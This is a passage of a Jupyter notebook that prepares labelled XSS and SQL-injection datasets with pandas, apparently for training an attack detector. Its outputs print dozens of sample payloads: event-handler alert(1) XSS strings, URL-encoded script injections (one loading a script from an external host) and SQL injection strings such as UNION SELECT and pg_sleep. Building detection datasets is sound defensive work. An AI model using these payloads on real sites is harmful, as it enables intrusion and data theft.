       "...                                                  ...  ...\n",
       "40794  produto=%22%3E'%3E%3CSCRIPT%3Ealert(String.fro...    1\n",
       "40795  m=%22%3E'%3E%3CSCRIPT%3Ealert(String.fromCharC...    1\n",
       "40796      q=%3Cscript%3Ealert%28%22m%22%29%3C/script%3E    1\n",
       "40797  Search=%22%3E'%3E%3CSCRIPT%20SRC=http://br.zon...    1\n",
       "40798  method=show&lojaPrincipal=&areaName=busca&nome...    1\n",
       "\n",
       "[40799 rows x 2 columns]"
      ]
     },
     "execution_count": 766,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "xss_scxm[\"xss\"] = xss_scxm[\"xss\"].apply(lambda x: int(1) if x == 1 else 0)\n",
    "xss_scxm"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 767,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "application/vnd.microsoft.datawrangler.viewer.v0+json": {
       "columns": [
        {
         "name": "index",
         "rawType": "int64",
         "type": "integer"
        },
        {
         "name": "payload",
         "rawType": "object",
         "type": "string"
        },
        {
         "name": "xss",
         "rawType": "int64",
         "type": "integer"
        }
       ],
       "conversionMethod": "pd.DataFrame",
       "ref": "edd19534-039b-4756-a4f6-fa01c05c3189",
       "rows": [],
       "shape": {
        "columns": 2,
        "rows": 0
       }
      },
      "text/html": [
       "<div>\n",
       "<style scoped>\n",
       "    .dataframe tbody tr th:only-of-type {\n",
       "        vertical-align: middle;\n",
       "    }\n",
       "\n",
       "    .dataframe tbody tr th {\n",
       "        vertical-align: top;\n",
       "    }\n",
       "\n",
       "    .dataframe thead th {\n",
       "        text-align: right;\n",
       "    }\n",
       "</style>\n",
       "<table border=\"1\" class=\"dataframe\">\n",
       "  <thead>\n",
       "    <tr style=\"text-align: right;\">\n",
       "      <th></th>\n",
       "      <th>payload</th>\n",
       "      <th>xss</th>\n",
       "    </tr>\n",
       "  </thead>\n",
       "  <tbody>\n",
       "  </tbody>\n",
       "</table>\n",
       "</div>"
      ],
      "text/plain": [
       "Empty DataFrame\n",
       "Columns: [payload, xss]\n",
       "Index: []"
      ]
     },
     "execution_count": 767,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "xss_scxm[xss_scxm[\"xss\"] != 1]"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 768,
   "metadata": {},
   "outputs": [],
   "source": [
    "xss_scxm.to_csv(\"../Datasets/Processed/xss_scxm.csv\", index=False)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### SQLInjection_XSS_MixDataset.1.0.0.csv"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 769,
   "metadata": {},
   "outputs": [],
   "source": [
    "sxm = pd.read_csv(\"../Datasets/SQLInjection_XSS_MixDataset.1.0.0.csv\")"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 770,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "application/vnd.microsoft.datawrangler.viewer.v0+json": {
       "columns": [
        {
         "name": "index",
         "rawType": "int64",
         "type": "integer"
        },
        {
         "name": "Sentence",
         "rawType": "object",
         "type": "string"
        },
        {
         "name": "SQLInjection",
         "rawType": "float64",
         "type": "float"
        },
        {
         "name": "XSS",
         "rawType": "float64",
         "type": "float"
        },
        {
         "name": "Normal",
         "rawType": "float64",
         "type": "float"
        }
       ],
       "conversionMethod": "pd.DataFrame",
       "ref": "d1b3ff24-5dd3-4bd9-b2a7-9345fdffbbec",
       "rows": [
        [
         "0",
         "\" or pg_sleep ( __TIME__ ) --",
         "1.0",
         "0.0",
         "0.0"
        ],
        [
         "1",
         "create user name identified by pass123 temporary tablespace temp default tablespace users; ",
         "1.0",
         "0.0",
         "0.0"
        ],
        [
         "2",
         "%29",
         "1.0",
         "0.0",
         "0.0"
        ],
        [
         "3",
         "' AND 1 = utl_inaddr.get_host_address  (  (  SELECT DISTINCT ( table_name )  FROM  ( SELECT DISTINCT ( table_name ) , ROWNUM AS LIMIT FROM sys.all_tables )  WHERE LIMIT = 5  )  )   AND 'i' = 'i",
         "1.0",
         "0.0",
         "0.0"
        ],
        [
         "4",
         " select * from users where id = '1' or @ @1 = 1 union select 1,version (  )  -- 1'",
         "1.0",
         "0.0",
         "0.0"
        ]
       ],
       "shape": {
        "columns": 4,
        "rows": 5
       }
      },
      "text/html": [
       "<div>\n",
       "<style scoped>\n",
       "    .dataframe tbody tr th:only-of-type {\n",
       "        vertical-align: middle;\n",
       "    }\n",
       "\n",
       "    .dataframe tbody tr th {\n",
       "        vertical-align: top;\n",
       "    }\n",
       "\n",
       "    .dataframe thead th {\n",
       "        text-align: right;\n",
       "    }\n",
       "</style>\n",
       "<table border=\"1\" class=\"dataframe\">\n",
       "  <thead>\n",
       "    <tr style=\"text-align: right;\">\n",
       "      <th></th>\n",
       "      <th>Sentence</th>\n",
       "      <th>SQLInjection</th>\n",
       "      <th>XSS</th>\n",
       "      <th>Normal</th>\n",
       "    </tr>\n",
       "  </thead>\n",
       "  <tbody>\n",
       "    <tr>\n",
       "      <th>0</th>\n",
       "      <td>\" or pg_sleep ( __TIME__ ) --</td>\n",
       "      <td>1.0</td>\n",
       "      <td>0.0</td>\n",
       "      <td>0.0</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>1</th>\n",
       "      <td>create user name identified by pass123 tempora...</td>\n",
       "      <td>1.0</td>\n",
       "      <td>0.0</td>\n",
       "      <td>0.0</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>2</th>\n",
       "      <td>%29</td>\n",
       "      <td>1.0</td>\n",
       "      <td>0.0</td>\n",
       "      <td>0.0</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>3</th>\n",
       "      <td>' AND 1 = utl_inaddr.get_host_address  (  (  S...</td>\n",
       "      <td>1.0</td>\n",
       "      <td>0.0</td>\n",
       "      <td>0.0</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>4</th>\n",
       "      <td>select * from users where id = '1' or @ @1 = ...</td>\n",
       "      <td>1.0</td>\n",
       "      <td>0.0</td>\n",
       "      <td>0.0</td>\n",
       "    </tr>\n",
       "  </tbody>\n",
       "</table>\n",
       "</div>"
      ],
      "text/plain": [
       "                                            Sentence  SQLInjection  XSS  \\\n",
       "0                      \" or pg_sleep ( __TIME__ ) --           1.0  0.0   \n",
       "1  create user name identified by pass123 tempora...           1.0  0.0   \n",
       "2                                                %29           1.0  0.0   \n",
       "3  ' AND 1 = utl_inaddr.get_host_address  (  (  S...           1.0  0.0   \n",
       "4   select * from users where id = '1' or @ @1 = ...           1.0  0.0   \n",
       "\n",
       "   Normal  \n",
       "0     0.0  \n",
       "1     0.0  \n",
       "2     0.0  \n",
       "3     0.0  \n",
       "4     0.0  "
      ]
     },
     "execution_count": 770,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "sxm.head()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 771,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "<class 'pandas.core.frame.DataFrame'>\n",
      "RangeIndex: 156636 entries, 0 to 156635\n",
      "Data columns (total 4 columns):\n",
      " #   Column        Non-Null Count   Dtype  \n",
      "---  ------        --------------   -----  \n",
      " 0   Sentence      156636 non-null  object \n",
      " 1   SQLInjection  156636 non-null  float64\n",
      " 2   XSS           156636 non-null  float64\n",
      " 3   Normal        156636 non-null  float64\n",
      "dtypes: float64(3), object(1)\n",
      "memory usage: 4.8+ MB\n"
     ]
    }
   ],
   "source": [
    "sxm.info()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 772,
   "metadata": {},
   "outputs": [
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "/var/folders/3h/x3xvrvmn1k739nf02crffq1h0000gn/T/ipykernel_15855/1555378815.py:2: SettingWithCopyWarning: \n",
      "A value is trying to be set on a copy of a slice from a DataFrame\n",
      "\n",
      "See the caveats in the documentation: https://pandas.pydata.org/pandas-docs/stable/user_guide/indexing.html#returning-a-view-versus-a-copy\n",
      "  xss_sxm.rename(columns={\"Sentence\": \"payload\", \"XSS\": \"xss\"}, inplace=True)\n"
     ]
    }
   ],
   "source": [
    "xss_sxm = sxm[[\"Sentence\", \"XSS\"]]\n",
    "xss_sxm.rename(columns={\"Sentence\": \"payload\", \"XSS\": \"xss\"}, inplace=True)\n",
    "xss_sxm = xss_sxm[xss_sxm[\"xss\"] == 1]\n",
    "xss_sxm[\"xss\"] = xss_sxm[\"xss\"].apply(lambda x: int(1) if x == 1 else 0)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 773,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "application/vnd.microsoft.datawrangler.viewer.v0+json": {
       "columns": [
        {
         "name": "index",
         "rawType": "int64",
         "type": "integer"
        },
        {
         "name": "payload",
         "rawType": "object",
         "type": "string"
        },
        {
         "name": "xss",
         "rawType": "int64",
         "type": "integer"
        }
       ],
       "conversionMethod": "pd.DataFrame",
       "ref": "7200365f-5366-4467-9d37-288cce1353b5",
       "rows": [
        [
         "109525",
         "<tt onmouseover=\"alert(1)\">test</tt>",
         "1"
        ],
        [
         "109535",
         "<a onblur=alert(1) tabindex=1 id=x></a><input autofocus>",
         "1"
        ],
        [
         "109536",
         "<col draggable=\"true\" ondragenter=\"alert(1)\">test</col>",
         "1"
        ],
        [
         "109537",
         "<caption onpointerdown=alert(1)>XSS</caption>",
         "1"
        ],
        [
         "109540",
         "<caption id=x tabindex=1 ondeactivate=alert(1)></caption><input id=y autofocus>",
         "1"
        ],
        [
         "109541",
         "<style onmouseleave=\"alert(1)\">test</style>",
         "1"
        ],
        [
         "109542",
         "<svg><meta onload=alert(1)></meta>",
         "1"
        ],
        [
         "109544",
         "<figcaption onpointerleave=alert(1)>XSS</figcaption>",
         "1"
        ],
        [
         "109547",
         "<datalist id=x tabindex=1 onfocusin=alert(1)></datalist>",
         "1"
        ],
        [
         "109548",
         "<input type=image src=1 onerror=alert(1)>",
         "1"
        ],
        [
         "109549",
         "<strong ondblclick=\"alert(1)\">test</strong>",
         "1"
        ],
        [
         "109551",
         "<div draggable=\"true\" contenteditable>drag me</div><input ondragover=alert(1) contenteditable>drop here</input>",
         "1"
        ],
        [
         "109554",
         "<spacer onkeypress=\"alert(1)\" contenteditable>test</spacer>",
         "1"
        ],
        [
         "109556",
         "<style>@keyframes slidein {}</style><center style=\"animation-duration:1s;animation-name:slidein;animation-iteration-count:2\" onanimationiteration=\"alert(1)\"></center>",
         "1"
        ],
        [
         "109557",
         "<pre draggable=\"true\" ondragend=\"alert(1)\">test</pre>",
         "1"
        ],
        [
         "109560",
         "<colgroup onblur=alert(1) tabindex=1 id=x></colgroup><input autofocus>",
         "1"
        ],
        [
         "109561",
         "<style>@keyframes x{}</style><main style=\"animation-name:x\" onanimationstart=\"alert(1)\"></main>",
         "1"
        ],
        [
         "109562",
         "<article draggable=\"true\" ondrag=\"alert(1)\">test</article>",
         "1"
        ],
        [
         "109565",
         "<rtc draggable=\"true\" ondragleave=\"alert(1)\">test</rtc>",
         "1"
        ],
        [
         "109571",
         "<div draggable=\"true\" contenteditable>drag me</div><sup ondrop=alert(1) contenteditable>drop here</sup>",
         "1"
        ],
        [
         "109574",
         "<frame oncut=\"alert(1)\" contenteditable>test</frame>",
         "1"
        ],
        [
         "109576",
         "<frameset onmouseover=\"alert(1)\">test</frameset>",
         "1"
        ],
        [
         "109577",
         "<style>@keyframes x{}</style><nobr style=\"animation-name:x\" onanimationstart=\"alert(1)\"></nobr>",
         "1"
        ],
        [
         "109580",
         "<iframe onload=alert(1)></iframe>",
         "1"
        ],
        [
         "109581",
         "<strong draggable=\"true\" ondragstart=\"alert(1)\">test</strong>",
         "1"
        ],
        [
         "109585",
         "<style>@keyframes x{}</style><h1 style=\"animation-name:x\" onanimationstart=\"alert(1)\"></h1>",
         "1"
        ],
        [
         "109586",
         "<article onpointerleave=alert(1)>XSS</article>",
         "1"
        ],
        [
         "109587",
         "<nextid onmousemove=\"alert(1)\">test</nextid>",
         "1"
        ],
        [
         "109588",
         "javascript:document.location=",
         "1"
        ],
        [
         "109589",
         "<style>@keyframes x{}</style><area style=\"animation-name:x\" onanimationend=\"alert(1)\"></area>",
         "1"
        ],
        [
         "109590",
         "<blockquote onpointermove=alert(1)>XSS</blockquote>",
         "1"
        ],
        [
         "109591",
         "<time onfocusout=alert(1) tabindex=1 id=x></time><input autofocus>",
         "1"
        ],
        [
         "109595",
         "<style>@keyframes x{}</style><title style=\"animation-name:x\" onanimationend=\"alert(1)\"></title>",
         "1"
        ],
        [
         "109599",
         "<noembed onpointerout=alert(1)>XSS</noembed>",
         "1"
        ],
        [
         "109600",
         "<data onbeforecut=\"alert(1)\" contenteditable>test</data>",
         "1"
        ],
        [
         "109601",
         "<A HREF=\"http://ha.ckers.org@google\"></A>",
         "1"
        ],
        [
         "109602",
         "<plaintext oncut=\"alert(1)\" contenteditable>test</plaintext>",
         "1"
        ],
        [
         "109603",
         "<s onmousedown=\"alert(1)\">test</s>",
         "1"
        ],
        [
         "109604",
         "<address onkeypress=\"alert(1)\" contenteditable>test</address>",
         "1"
        ],
        [
         "109606",
         "<optgroup onmouseover=\"alert(1)\">test</optgroup>",
         "1"
        ],
        [
         "109611",
         "<script onmouseover=\"alert(1)\">test</script>",
         "1"
        ],
        [
         "109612",
         "<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><sub id=x style=\"position:absolute;\" onanimationcancel=\"alert(1)\"></sub>",
         "1"
        ],
        [
         "109614",
         "<image onclick=\"alert(1)\">test</image>",
         "1"
        ],
        [
         "109616",
         "<tfoot onclick=\"alert(1)\">test</tfoot>",
         "1"
        ],
        [
         "109617",
         "<ul onpointerenter=alert(1)>XSS</ul>",
         "1"
        ],
        [
         "109618",
         "<bdo draggable=\"true\" ondragenter=\"alert(1)\">test</bdo>",
         "1"
        ],
        [
         "109620",
         "<spacer id=x tabindex=1 onbeforeactivate=alert(1)></spacer>",
         "1"
        ],
        [
         "109621",
         "<style>@keyframes slidein {}</style><shadow style=\"animation-duration:1s;animation-name:slidein;animation-iteration-count:2\" onanimationiteration=\"alert(1)\"></shadow>",
         "1"
        ],
        [
         "109622",
         "<noscript id=x tabindex=1 onfocusin=alert(1)></noscript>",
         "1"
        ],
        [
         "109623",
         "<dd onmouseout=\"alert(1)\">test</dd>",
         "1"
        ]
       ],
       "shape": {
        "columns": 2,
        "rows": 40799
       }
      },
      "text/html": [
       "<div>\n",
       "<style scoped>\n",
       "    .dataframe tbody tr th:only-of-type {\n",
       "        vertical-align: middle;\n",
       "    }\n",
       "\n",
       "    .dataframe tbody tr th {\n",
       "        vertical-align: top;\n",
       "    }\n",
       "\n",
       "    .dataframe thead th {\n",
       "        text-align: right;\n",
       "    }\n",
       "</style>\n",
       "<table border=\"1\" class=\"dataframe\">\n",
       "  <thead>\n",
       "    <tr style=\"text-align: right;\">\n",
       "      <th></th>\n",
       "      <th>payload</th>\n",
       "      <th>xss</th>\n",
       "    </tr>\n",
       "  </thead>\n",
       "  <tbody>\n",
       "    <tr>\n",
       "      <th>109525</th>\n",
       "      <td>&lt;tt onmouseover=\"alert(1)\"&gt;test&lt;/tt&gt;</td>\n",
       "      <td>1</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>109535</th>\n",
       "      <td>&lt;a onblur=alert(1) tabindex=1 id=x&gt;&lt;/a&gt;&lt;input ...</td>\n",
       "      <td>1</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>109536</th>\n",
       "      <td>&lt;col draggable=\"true\" ondragenter=\"alert(1)\"&gt;t...</td>\n",
       "      <td>1</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>109537</th>\n",
       "      <td>&lt;caption onpointerdown=alert(1)&gt;XSS&lt;/caption&gt;</td>\n",
       "      <td>1</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>109540</th>\n",
       "      <td>&lt;caption id=x tabindex=1 ondeactivate=alert(1)...</td>\n",
       "      <td>1</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>...</th>\n",
       "      <td>...</td>\n",
       "      <td>...</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>156631</th>\n",
       "      <td>produto=%22%3E'%3E%3CSCRIPT%3Ealert(String.fro...</td>\n",
       "      <td>1</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>156632</th>\n",
       "      <td>m=%22%3E'%3E%3CSCRIPT%3Ealert(String.fromCharC...</td>\n",
       "      <td>1</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>156633</th>\n",
       "      <td>q=%3Cscript%3Ealert%28%22m%22%29%3C/script%3E</td>\n",
       "      <td>1</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>156634</th>\n",
       "      <td>Search=%22%3E'%3E%3CSCRIPT%20SRC=http://br.zon...</td>\n",
       "      <td>1</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>156635</th>\n",
       "      <td>method=show&amp;lojaPrincipal=&amp;areaName=busca&amp;nome...</td>\n",
       "      <td>1</td>\n",
       "    </tr>\n",
       "  </tbody>\n",
       "</table>\n",
       "<p>40799 rows × 2 columns</p>\n",
       "</div>"
      ],
      "text/plain": [
       "                                                  payload  xss\n",
       "109525               <tt onmouseover=\"alert(1)\">test</tt>    1\n",
       "109535  <a onblur=alert(1) tabindex=1 id=x></a><input ...    1\n",
       "109536  <col draggable=\"true\" ondragenter=\"alert(1)\">t...    1\n",
       "109537      <caption onpointerdown=alert(1)>XSS</caption>    1\n",
       "109540  <caption id=x tabindex=1 ondeactivate=alert(1)...    1\n",
       "...                                                   ...  ...\n",
       "156631  produto=%22%3E'%3E%3CSCRIPT%3Ealert(String.fro...    1\n",
       "156632  m=%22%3E'%3E%3CSCRIPT%3Ealert(String.fromCharC...    1\n",
       "156633      q=%3Cscript%3Ealert%28%22m%22%29%3C/script%3E    1\n",
       "156634  Search=%22%3E'%3E%3CSCRIPT%20SRC=http://br.zon...    1\n",
       "156635  method=show&lojaPrincipal=&areaName=busca&nome...    1\n",
       "\n",
       "[40799 rows x 2 columns]"
      ]
     },
     "execution_count": 773,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "xss_sxm"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 774,
   "metadata": {},
   "outputs": [],
   "source": [
    "xss_sxm.to_csv(\"../Datasets/Processed/xss_sxm.csv\", index=False)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### XSS_dataset.csv"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 775,
   "metadata": {},
   "outputs": [],
   "source": [
    "xss_data = pd.read_csv(\"../Datasets/XSS_dataset.csv\")"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 776,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "application/vnd.microsoft.datawrangler.viewer.v0+json": {
       "columns": [
        {
         "name": "index",
         "rawType": "int64",
         "type": "integer"
        },
        {
         "name": "Unnamed: 0",
         "rawType": "int64",
         "type": "integer"
        },
        {
         "name": "Sentence",
         "rawType": "object",
         "type": "string"
        },
        {
         "name": "Label",
         "rawType": "int64",
         "type": "integer"
        }
       ],
       "conversionMethod": "pd.DataFrame",
       "ref": "aae7920a-613b-449f-899e-d1ac165d14ed",
       "rows": [
        [
         "0",
         "0",
         "<li><a href=\"/wiki/File:Socrates.png\" class=\"image\"><img alt=\"Socrates.png\" src=\"//upload.wikimedia.org/wikipedia/commons/thumb/c/cd/Socrates.png/18px-Socrates.png\" decoding=\"async\" width=\"18\" height=\"28\" class=\"noviewer\" srcset=\"//upload.wikimedia.org/wikipedia/commons/thumb/c/cd/Socrates.png/27px-Socrates.png 1.5x, //upload.wikimedia.org/wikipedia/commons/thumb/c/cd/Socrates.png/36px-Socrates.png 2x\" data-file-width=\"326\" data-file-height=\"500\" /> </a> <a href=\"/wiki/Portal:Philosophy\" title=\"Portal:Philosophy\">Philosophy&#32;portal </a> </li> </ul>",
         "0"
        ],
        [
         "1",
         "1",
         "<tt onmouseover=\"alert(1)\">test</tt>",
         "1"
        ],
        [
         "2",
         "2",
         "\t </span> <span class=\"reference-text\">Steering for the 1995 \"<a href=\"/wiki/History_of_autonomous_cars#1990s\" class=\"mw-redirect\" title=\"History of autonomous cars\">No Hands Across America </a>\" required \"only a few human assists\". ",
         "0"
        ],
        [
         "3",
         "3",
         "\t </span> <span class=\"reference-text\"><cite class=\"citation web\"><a rel=\"nofollow\" class=\"external text\" href=\"https://www.mileseducation.com/finance/artificial_intelligence\">\"Miles Education | Future Of Finance | Blockchain Fundamentals for F&amp;A Professionals Certificate\" </a>. <i>www.mileseducation.com </i><span class=\"reference-accessdate\">. Retrieved <span class=\"nowrap\">26 September ",
         "0"
        ],
        [
         "4",
         "4",
         "\t </span>. <a href=\"/wiki/Digital_object_identifier\" title=\"Digital object identifier\">doi </a>:<a rel=\"nofollow\" class=\"external text\" href=\"https://doi.org/10.1016%2FS0921-8890%2805%2980025-9\">10.1016/S0921-8890(05)80025-9 </a>. <a rel=\"nofollow\" class=\"external text\" href=\"https://web.archive.org/web/20070809020912/http://people.csail.mit.edu/brooks/papers/elephants.pdf\">Archived </a> <span class=\"cs1-format\">(PDF) ",
         "0"
        ]
       ],
       "shape": {
        "columns": 3,
        "rows": 5
       }
      },
      "text/html": [
       "<div>\n",
       "<style scoped>\n",
       "    .dataframe tbody tr th:only-of-type {\n",
       "        vertical-align: middle;\n",
       "    }\n",
       "\n",
       "    .dataframe tbody tr th {\n",
       "        vertical-align: top;\n",
       "    }\n",
       "\n",
       "    .dataframe thead th {\n",
       "        text-align: right;\n",
       "    }\n",
       "</style>\n",
       "<table border=\"1\" class=\"dataframe\">\n",
       "  <thead>\n",
       "    <tr style=\"text-align: right;\">\n",
       "      <th></th>\n",
       "      <th>Unnamed: 0</th>\n",
       "      <th>Sentence</th>\n",
       "      <th>Label</th>\n",
       "    </tr>\n",
       "  </thead>\n",
       "  <tbody>\n",
       "    <tr>\n",
       "      <th>0</th>\n",
       "      <td>0</td>\n",
       "      <td>&lt;li&gt;&lt;a href=\"/wiki/File:Socrates.png\" class=\"i...</td>\n",
       "      <td>0</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>1</th>\n",
       "      <td>1</td>\n",
       "      <td>&lt;tt onmouseover=\"alert(1)\"&gt;test&lt;/tt&gt;</td>\n",
       "      <td>1</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>2</th>\n",
       "      <td>2</td>\n",
       "      <td>\\t &lt;/span&gt; &lt;span class=\"reference-text\"&gt;Steeri...</td>\n",
       "      <td>0</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>3</th>\n",
       "      <td>3</td>\n",
       "      <td>\\t &lt;/span&gt; &lt;span class=\"reference-text\"&gt;&lt;cite ...</td>\n",
       "      <td>0</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>4</th>\n",
       "      <td>4</td>\n",
       "      <td>\\t &lt;/span&gt;. &lt;a href=\"/wiki/Digital_object_iden...</td>\n",
       "      <td>0</td>\n",
       "    </tr>\n",
       "  </tbody>\n",
       "</table>\n",
       "</div>"
      ],
      "text/plain": [
       "   Unnamed: 0                                           Sentence  Label\n",
       "0           0  <li><a href=\"/wiki/File:Socrates.png\" class=\"i...      0\n",
       "1           1               <tt onmouseover=\"alert(1)\">test</tt>      1\n",
       "2           2  \\t </span> <span class=\"reference-text\">Steeri...      0\n",
       "3           3  \\t </span> <span class=\"reference-text\"><cite ...      0\n",
       "4           4  \\t </span>. <a href=\"/wiki/Digital_object_iden...      0"
      ]
     },
     "execution_count": 776,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "xss_data.head()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 777,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "<class 'pandas.core.frame.DataFrame'>\n",
      "RangeIndex: 13686 entries, 0 to 13685\n",
      "Data columns (total 3 columns):\n",
      " #   Column      Non-Null Count  Dtype \n",
      "---  ------      --------------  ----- \n",
      " 0   Unnamed: 0  13686 non-null  int64 \n",
      " 1   Sentence    13686 non-null  object\n",
      " 2   Label       13686 non-null  int64 \n",
      "dtypes: int64(2), object(1)\n",
      "memory usage: 320.9+ KB\n"
     ]
    }
   ],
   "source": [
    "xss_data.info()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 778,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "application/vnd.microsoft.datawrangler.viewer.v0+json": {
       "columns": [
        {
         "name": "index",
         "rawType": "int64",
         "type": "integer"
        },
        {
         "name": "payload",
         "rawType": "object",
         "type": "string"
        },
        {
         "name": "xss",
         "rawType": "int64",
         "type": "integer"
        }
       ],
       "conversionMethod": "pd.DataFrame",
       "ref": "da6312c5-69f1-457d-87ec-8df8cac4210c",
       "rows": [
        [
         "0",
         "<li><a href=\"/wiki/File:Socrates.png\" class=\"image\"><img alt=\"Socrates.png\" src=\"//upload.wikimedia.org/wikipedia/commons/thumb/c/cd/Socrates.png/18px-Socrates.png\" decoding=\"async\" width=\"18\" height=\"28\" class=\"noviewer\" srcset=\"//upload.wikimedia.org/wikipedia/commons/thumb/c/cd/Socrates.png/27px-Socrates.png 1.5x, //upload.wikimedia.org/wikipedia/commons/thumb/c/cd/Socrates.png/36px-Socrates.png 2x\" data-file-width=\"326\" data-file-height=\"500\" /> </a> <a href=\"/wiki/Portal:Philosophy\" title=\"Portal:Philosophy\">Philosophy&#32;portal </a> </li> </ul>",
         "0"
        ],
        [
         "1",
         "<tt onmouseover=\"alert(1)\">test</tt>",
         "1"
        ],
        [
         "2",
         "\t </span> <span class=\"reference-text\">Steering for the 1995 \"<a href=\"/wiki/History_of_autonomous_cars#1990s\" class=\"mw-redirect\" title=\"History of autonomous cars\">No Hands Across America </a>\" required \"only a few human assists\". ",
         "0"
        ],
        [
         "3",
         "\t </span> <span class=\"reference-text\"><cite class=\"citation web\"><a rel=\"nofollow\" class=\"external text\" href=\"https://www.mileseducation.com/finance/artificial_intelligence\">\"Miles Education | Future Of Finance | Blockchain Fundamentals for F&amp;A Professionals Certificate\" </a>. <i>www.mileseducation.com </i><span class=\"reference-accessdate\">. Retrieved <span class=\"nowrap\">26 September ",
         "0"
        ],
        [
         "4",
         "\t </span>. <a href=\"/wiki/Digital_object_identifier\" title=\"Digital object identifier\">doi </a>:<a rel=\"nofollow\" class=\"external text\" href=\"https://doi.org/10.1016%2FS0921-8890%2805%2980025-9\">10.1016/S0921-8890(05)80025-9 </a>. <a rel=\"nofollow\" class=\"external text\" href=\"https://web.archive.org/web/20070809020912/http://people.csail.mit.edu/brooks/papers/elephants.pdf\">Archived </a> <span class=\"cs1-format\">(PDF) ",
         "0"
        ],
        [
         "5",
         "<li id=\"cite_note-118\"><span class=\"mw-cite-backlink\"><b><a href=\"#cite_ref-118\">^ </a> </b> ",
         "0"
        ],
        [
         "6",
         "<li><a href=\"/wiki/Contextualism\" title=\"Contextualism\">Contextualism </a> </li>",
         "0"
        ],
        [
         "7",
         "<li id=\"cite_note-Representing_causation-95\"><span class=\"mw-cite-backlink\">^ <a href=\"#cite_ref-Representing_causation_95-0\"><sup><i><b>a </b> </i> </sup> </a> <a href=\"#cite_ref-Representing_causation_95-1\"><sup><i><b>b </b> </i> </sup> </a> ",
         "0"
        ],
        [
         "8",
         " <tr><td class=\"plainlist\" style=\"padding:0 0.1em 0.4em\">",
         "0"
        ],
        [
         "9",
         "\t </span>",
         "0"
        ],
        [
         "10",
         "<li><a href=\"/wiki/Mind%E2%80%93body_problem\" title=\"Mind–body problem\">Mind–body problem </a>",
         "0"
        ],
        [
         "11",
         "<a onblur=alert(1) tabindex=1 id=x></a><input autofocus>",
         "1"
        ],
        [
         "12",
         "<col draggable=\"true\" ondragenter=\"alert(1)\">test</col>",
         "1"
        ],
        [
         "13",
         "<caption onpointerdown=alert(1)>XSS</caption>",
         "1"
        ],
        [
         "14",
         "\t </span>",
         "0"
        ],
        [
         "15",
         "\t </span><link rel=\"mw-deduplicated-inline-style\" href=\"mw-data:TemplateStyles:r935243608\"/> </li>",
         "0"
        ],
        [
         "16",
         "<caption id=x tabindex=1 ondeactivate=alert(1)></caption><input id=y autofocus>",
         "1"
        ],
        [
         "17",
         "<style onmouseleave=\"alert(1)\">test</style>",
         "1"
        ],
        [
         "18",
         "<svg><meta onload=alert(1)></meta>",
         "1"
        ],
        [
         "19",
         "<li><a href=\"/wiki/Programming_language\" title=\"Programming language\">Programming language </a> </li>",
         "0"
        ],
        [
         "20",
         "<figcaption onpointerleave=alert(1)>XSS</figcaption>",
         "1"
        ],
        [
         "21",
         "\t </span> <span class=\"reference-text\"><cite class=\"citation news\"><a rel=\"nofollow\" class=\"external text\" href=\"https://www.economist.com/news/special-report/21700756-artificial-intelligence-boom-based-old-idea-modern-twist-not\">\"From not working to neural networking\" </a>. <i>The Economist </i>. 2016<span class=\"reference-accessdate\">. Retrieved <span class=\"nowrap\">26 April ",
         "0"
        ],
        [
         "22",
         "</div>",
         "0"
        ],
        [
         "23",
         "<datalist id=x tabindex=1 onfocusin=alert(1)></datalist>",
         "1"
        ],
        [
         "24",
         "<input type=image src=1 onerror=alert(1)>",
         "1"
        ],
        [
         "25",
         "<strong ondblclick=\"alert(1)\">test</strong>",
         "1"
        ],
        [
         "26",
         "<li><a href=\"/wiki/Computer_data_storage\" title=\"Computer data storage\">Information storage systems </a> </li>",
         "0"
        ],
        [
         "27",
